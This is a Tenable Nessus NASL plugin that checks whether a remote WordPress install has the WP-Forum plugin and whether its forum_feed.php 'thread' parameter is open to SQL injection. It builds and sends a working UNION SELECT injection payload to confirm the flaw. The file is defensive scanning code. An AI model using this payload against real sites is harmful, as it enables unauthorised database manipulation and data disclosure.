#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(35370);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_bugtraq_id(33223);
  script_xref(name:"EDB-ID", value:"7738");

  script_name(english:"WP-Forum Plugin for WordPress 'forum_feed.php' 'thread' Parameter SQL Injection");
  script_summary(english:"Tries to manipulate feed results");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a SQL
injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running WP-Forum, a third-party discussion forum
plugin for WordPress.

The version of WP-Forum installed on the remote host fails to sanitize
input to the 'thread' parameter of the 'forum_feed.php' script before
using it in a database query. Regardless of PHP's 'magic_quotes_gpc'
setting, an attacker can exploit this issue to manipulate database
queries, leading to the disclosure of sensitive information, the
modification of data, or attacks against the underlying database.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/01/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/01/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'WP-Forum';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "wp-forum/js/script.js"][0] =
    make_list('var current');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

magic1 = SCRIPT_NAME;
enc_magic1 = "char(";
for (i=0; i<strlen(magic1)-1; i++)
  enc_magic1 += ord(magic1[i]) + ",";
enc_magic1 += ord(magic1[i]) + ")";
magic2 = unixtime();
exploit = "-99999 UNION SELECT 1," + enc_magic1 + "," + magic2 + ",4,5,6,7-- ";


# Try to exploit the issue to manipulate the feed output.
url =
    "/wp-content/plugins/wp-forum/forum_feed.php?" +
    "thread=" + str_replace(find:" ", replace:"%20", string:exploit);

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + url,
  exit_on_fail : TRUE
);

# There's a problem if we could manipulate the feed output.
if (
  "<description>" + magic1 + "</description>" >< res[2] &&
  "&amp;thread=" + magic2 + "&amp;start=" >< res[2]
)
{
  set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);

  if (report_verbosity > 0)
  {
    report =
      '\n' +
      'Nessus was able to verify the vulnerability exists using the following\n' +
      'request :\n' +
      '\n' +
      '  ' + install_url + url + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
